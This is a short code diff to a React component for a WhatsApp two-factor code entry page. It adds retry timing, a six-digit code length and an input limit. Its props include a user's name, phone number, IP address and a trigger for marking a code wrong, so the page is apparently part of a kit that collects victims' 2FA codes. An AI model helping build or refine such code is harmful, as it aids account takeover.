@@ -147,7 +147,10 @@ function Fa2Whatsapp({ Unik, setStep, Name, Tel, Ip, LastFetch, wrong2faTrigger 
     nextStep: 4,
     componentName: "WhatsApp 2FA",
     initialMessage: "WhatsApp 2FA Page Loaded",
+    allowImmediateRetry: true,
+    immediateRetryDelay: 1500,
     countdownDuration: 60,
+    validCodeLengths: [6],
   });
   const [isResendActive, setIsResendActive] = useState(false);
   const [resendCountdown, setResendCountdown] = useState(60);
@@ -219,6 +222,7 @@ function Fa2Whatsapp({ Unik, setStep, Name, Tel, Ip, LastFetch, wrong2faTrigger 
                 type="number"
                 value={code}
                 onChange={handleCodeChange}
+                maxLength={6}
                 className={`form-control ${shouldShowRedBorder() ? "redborder" : ""}`}
                 disabled={isLoading}
               />
